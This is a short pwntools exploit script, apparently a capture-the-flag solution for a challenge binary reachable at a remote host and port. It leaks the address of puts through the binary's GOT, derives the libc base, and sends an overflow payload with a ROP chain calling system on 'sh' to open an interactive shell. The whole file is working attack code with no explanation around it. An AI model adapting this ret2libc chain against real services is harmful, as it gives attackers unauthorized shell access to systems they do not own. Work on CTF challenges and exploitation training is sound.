from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)


if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT=22966
   libc = ELF('libc6_2.38-1ubuntu6.1_amd64.so')
else:
   libc = e.libc

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)


p = start()

p.sendline(b'0')
p.recvuntil(b'leak')
p.sendline(b'%i' %e.got['puts'])
p.recvline()
leak=int(p.recvline().strip(b'\n'),16)
log.info(f"Leak: {hex(leak)}")
log.info("Libc Addr: {hex(libc.address)}")
libc.address=leak-libc.sym['puts']
log.info(f"Base: {hex(libc.address)}")

rl = ROP(libc)
ret = rl.find_gadget(['ret'])[0]
pop_rdi = rl.find_gadget(['pop rdi','ret'])[0]


p.sendline(b'1')
chain = cyclic(120)
chain += p64(ret)
chain += p64(pop_rdi)
chain += p64(next(e.search(b'sh')))
chain += p64(libc.sym['system'])

p.sendline(chain)

p.interactive()
